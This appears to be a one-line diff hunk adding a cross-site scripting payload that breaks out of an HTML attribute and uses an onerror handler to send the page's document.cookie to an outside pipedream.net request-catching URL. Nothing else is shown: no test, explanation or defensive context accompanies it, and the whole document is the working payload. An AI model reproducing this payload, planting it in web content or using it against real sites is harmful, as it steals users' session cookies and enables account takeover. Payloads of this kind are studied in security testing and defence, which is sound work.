@@ -1,0 +1,1 @@
+" onerror="this.src='https://enbyq7nd7fjm8.x.pipedream.net/?c='+document.cookie;"
